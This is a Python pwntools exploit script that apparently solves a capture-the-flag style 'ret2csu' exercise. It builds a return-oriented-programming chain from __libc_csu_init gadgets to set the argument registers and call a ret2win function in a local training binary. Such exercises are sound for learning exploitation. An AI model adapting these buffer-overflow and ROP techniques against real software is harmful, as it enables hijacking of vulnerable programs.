#!/usr/bin/python3
from pwn import *

REMOTE = False
ip = '127.0.0.1'
port = 80
filepath = './ret2csu'

elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']
if REMOTE is True:
    p = remote(ip, port)
else:
    p = process(filepath)
    # gdb.attach(p)
    ### OR if you want to start the process with gdb instead of attaching
    # p = gdb.debug(filepath, gdbscript='''
    # b *pwnme+0x98
    # c
    # ''')



rop = ROP(elf)

libc_csu_init_base = elf.symbols['__libc_csu_init']
ret2win = elf.symbols['ret2win']

# _term_proc: A function that does nothing
# sub     rsp, 8
# add     rsp, 8
# retn
ptr_ptr__term_proc = 0x600e48

# pop rdi
# ret
pop_rdi_gadget = p64(0x00000000004006a3)

# pop   rbx
# pop   rbp
# pop   r12
# pop   r13
# pop   r14
# pop   r15
# retn
gadget_1 = p64(libc_csu_init_base + 0x5A)

# mov   rdx, r15
# mov   rsi, r14
# mov   edi, r13d
# call  [r12+rbx*8]
gadget_2 = p64(libc_csu_init_base + 0x40)

rop.raw(rop.generatePadding(0, 40))
rop.raw(gadget_1)
rop.raw(p64(0x0000000000000000))  # rbx
rop.raw(p64(0x0000000000000001))  # rbp
rop.raw(p64(ptr_ptr__term_proc))  # r12
rop.raw(p64(0xDEADBEEFDEADBEEF)) # r13 -> rdi
rop.raw(p64(0xCAFEBABECAFEBABE)) # r14 -> rsi
rop.raw(p64(0xD00DF00DD00DF00D)) # r15 -> rdx
rop.raw(gadget_2)
rop.raw(p64(0x0000000000000000))  # lost cause add rsp, 8
rop.raw(p64(0x0000000000000000))  # rbx
rop.raw(p64(0x0000000000000000))  # rbp
rop.raw(p64(0x0000000000000000))  # r12
rop.raw(p64(0x0000000000000000)) # r13
rop.raw(p64(0x0000000000000000)) # r14
rop.raw(p64(0x0000000000000000)) # r15
rop.raw(pop_rdi_gadget)
rop.raw(p64(0xDEADBEEFDEADBEEF)) # rdi
rop.raw(p64(ret2win))  # call ret2win

print(p.recvuntil(b'> ').decode())
p.sendline(rop.chain())
print(p.recvall().decode())